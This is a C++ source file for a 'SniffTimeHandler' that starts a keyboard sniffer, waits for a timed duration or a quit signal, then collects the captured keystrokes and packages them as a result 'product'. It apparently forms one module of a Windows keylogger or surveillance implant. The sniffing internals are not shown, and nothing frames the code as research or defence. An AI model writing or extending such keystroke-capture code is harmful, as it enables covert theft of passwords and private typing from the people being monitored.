#include "SniffTimeHandler.hpp"

#include "ActiveKeySniff.hpp"
#include "Exception.hpp"
#include "Products/KeyboardEventsTypedProduct.hpp"

SniffTimeHandler::SniffTimeHandler(const Time::Duration duration,
                                   std::shared_ptr<IWaitable> quit_event,
                                   std::unique_ptr<Event> operation_event):
	IOperationHandler(std::move(operation_event)),
	m_duration(duration),
	m_quit_event(std::move(quit_event))
{
}

void SniffTimeHandler::run()
{
	ActiveKeySniff::start();

	switch (m_quit_event->wait(m_duration))
	{
	case WaitStatus::FAILED:
		[[fallthrough]];
	case WaitStatus::OBJECT_CLOSED:
		throw WinApiException(ErrorCode::FAILED_WAIT);

	case WaitStatus::FINISHED:
		throw Exception(ErrorCode::QUIT_SIGNALLED);

	case WaitStatus::TIMEOUT:
		break;

	default:
		throw Exception(ErrorCode::UNCOVERED_ENUM_VALUE);
	}

	ActiveKeySniff::stop();

	append(std::make_unique<KeyboardEventsTypedProduct>(std::move(ActiveKeySniff::g_keyboard_events)));
	finished();
}
